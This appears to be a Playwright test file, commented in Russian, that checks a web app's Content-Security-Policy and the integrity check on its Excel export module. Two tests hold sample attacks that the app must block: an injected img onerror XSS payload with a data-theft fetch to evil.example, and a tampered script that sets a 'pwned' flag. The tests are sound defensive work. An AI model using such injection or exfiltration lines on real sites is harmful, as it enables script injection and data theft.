// v2.63: политика безопасности содержимого (CSP) и проверка целостности модуля Excel
const { test, expect } = require('@playwright/test');
const fs = require('fs');
const path = require('path');
const { openApp, expectNoErrors, ROOT } = require('./helpers');

test('в собранных файлах есть CSP: скрипты только по хэшу, сеть — только к нужным сервисам', async () => {
  for(const f of ['index.html', 'friends/index.html']){
    const html = fs.readFileSync(path.join(ROOT, f), 'utf8');
    const m = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]*)">/);
    expect(m, f).toBeTruthy();
    const csp = m[1];
    expect(csp).not.toMatch(/script-src[^;]*'unsafe-inline'/);
    expect(csp).not.toMatch(/'unsafe-eval'/);
    expect(csp).toMatch(/connect-src 'self' https:\/\/nominatim\.openstreetmap\.org https:\/\/router\.project-osrm\.org https:\/\/api\.github\.com;/);
    // CSP стоит до первого скрипта
    expect(html.indexOf('Content-Security-Policy')).toBeLessThan(html.indexOf('<script'));
  }
});

test('внедрённый обработчик не выполняется, отправка на чужой адрес блокируется', async ({ page }) => {
  const { errors } = await openApp(page, { allowCsp: true });
  const r = await page.evaluate(async () => {
    const seen = [];
    document.addEventListener('securitypolicyviolation', e => seen.push(e.violatedDirective));
    const d = document.createElement('div');
    d.innerHTML = '<img src="data:," onerror="window.__pwned = 1">';
    document.body.append(d);
    let fetched = 'нет';
    try{ await fetch('https://evil.example/steal?d=1'); fetched = 'да'; }catch(e){ fetched = 'заблокировано'; }
    await new Promise(r => setTimeout(r, 300));
    return { pwned: window.__pwned || 0, fetched, seen };
  });
  expect(r.pwned).toBe(0);
  expect(r.fetched).toBe('заблокировано');
  expect(r.seen).toEqual(expect.arrayContaining(['script-src-attr', 'connect-src']));
  await expectNoErrors(errors);
});

test('Excel: модуль берётся со своего сайта с проверкой целостности; подменённый файл не выполняется', async ({ page }, info) => {
  test.skip(info.project.name !== 'desktop', 'достаточно одной раскладки');
  const { errors } = await openApp(page);
  const [x] = await Promise.all([page.waitForEvent('download', { timeout: 20000 }), page.evaluate(() => document.getElementById('exportXlsxBtn').click())]);
  expect(x.suggestedFilename()).toMatch(/\.xlsx$/);
  const buf = fs.readFileSync(await x.path());
  expect(buf.slice(0, 2).toString()).toBe('PK');
  await expectNoErrors(errors);
});

test('Excel: подмена файла модуля — браузер его не выполняет, приложение предлагает CSV', async ({ page }, info) => {
  test.skip(info.project.name !== 'desktop', 'достаточно одной раскладки');
  const { errors } = await openApp(page, { allowCsp: true });
  // своя копия подменена (маршрут, добавленный позже, срабатывает первым), CDN недоступен
  let served = 0;
  await page.route('**/vendor/xlsx-*.js', r => { served++; r.fulfill({ contentType: 'application/javascript', body: 'window.__pwned = 1; window.XLSX = {};' }); });
  await page.evaluate(() => document.getElementById('exportXlsxBtn').click());
  await expect(page.locator('#toast')).toContainText('Не удалось загрузить модуль XLSX');
  expect(served).toBe(1);
  expect(await page.evaluate(() => window.__pwned || 0)).toBe(0);
  await expectNoErrors(errors.filter(e => !/integrity|Failed to find a valid digest/i.test(e)));
});
